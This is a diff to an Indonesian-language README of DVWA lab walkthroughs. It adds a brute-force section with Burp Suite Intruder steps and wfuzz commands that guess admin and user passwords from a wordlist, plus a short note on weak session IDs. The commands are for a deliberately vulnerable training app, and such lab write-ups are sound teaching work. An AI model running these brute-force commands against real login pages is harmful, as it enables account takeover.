@@ -3,6 +3,42 @@ Damn Vulnerable Web Application (DVWA) adalah aplikasi web berbasis PHP/MySQL ya
 
 Informasi Download dan instalasi: https://github.com/digininja/DVWA
 
+## Brute Force
+Serangan brute-force terjadi saat penyerang menggunakan sistem coba-coba (trial and error) untuk menebak kredensial pengguna yang valid. Penyerang dapat mengotomatisasi proses penyerangan brute force dengan tool khusus sehingga penyerang dapat melakukan upaya login dalam jumlah besar dengan kecepatan tinggi.
+
+### Security Low
+- Brute force untuk menemukan password admin menggunakan tool Burp Suite. Pertama-tama bikin attack dengan tipe **Sniper** set payload hanya pada parameter password seperti pada gambar dibawah
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2026.JPG)
+
+- Buat payload dengan tipe **Simple List** dan klik load lalu pilih wordlist `/usr/share/seclists/Passwords/darkweb2017-top100.txt` dan jalankan serangan dengan menekam tombol Start Attack
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2027.JPG)
+
+- Setelah proses penyerangan selesai, kita bisa lakukan sorting berdasarkan length. Request yang memiliki length paling berbeda adalah hasil brute force nya
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2028.JPG)
+
+- Brute force password admin menggunakan tool wfuzz
+```sh
+wfuzz --hs "incorrect" -c -w /usr/share/seclists/Passwords/darkweb2017-top100.txt -b 'PHPSESSID=hash; security=low' 'http://<IP_Server>/DVWA/vulnerabilities/brute/index.php?username=admin&password=FUZZ&Login=Login'
+``` 
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2028.JPG)
+
+-Brute force password semua user dengan tool wfuzz
+```sh
+wfuzz --hs "incorrect" -c -z file,user-dvwa.txt -z file,/usr/share/seclists/Passwords/darkweb2017-top100.txt -b 'PHPSESSID=hash; security=low' 'http://<IP_Server>/DVWA/vulnerabilities/brute/index.php?username=FUZZ&password=FUZ2Z&Login=Login'
+``` 
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2029.JPG)
+
+### Security Medium
+- Disini kita dapat melakukan brute force dengan cara yang sama, namun tiap request terjeda selama 2 detik sehingga proses brute force menjadi sangat lama 
+```sh
+wfuzz --hs "incorrect" -c -w /usr/share/seclists/Passwords/darkweb2017-top100.txt -b 'PHPSESSID=hash; security=low' 'http://<IP_Server>/DVWA/vulnerabilities/brute/index.php?username=admin&password=FUZZ&Login=Login'
+``` 
+
 ## Command Injection
 Command Injection (Shell Injection) adalah celah keamanan web yang memungkinkan penyerang dapat mengeksekusi perintah sistem operasi (OS) sewenang-wenang di server yang menjalankan aplikasi, dan biasanya membahayakan aplikasi dan semua data.
 
@@ -195,6 +231,9 @@ Lakukan injeksi pada tag `<option>` menggunakan inspect element di browser
 ```
 
 ![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2012.JPG)
+
+## Weak Session IDS
+ID sesi yang lemah dapat memungkinkan pengguna lain dibajak sesinya. Jika ID sesi diambil dari rentang nilai yang kecil, penyerang hanya perlu menyelidiki ID sesi yang dipilih secara acak hingga menemukan kecocokan.
 
 ## XSS (DOM)
 DOM based XSS muncul ketika Javascript mengambil data dari sumber yang dapat dikontrol oleh penyerang misalnya seperti URL, yang memungkinkan penyerang mengeksekusi code JavaScript yang berbahaya dan membajak akun pengguna lain.
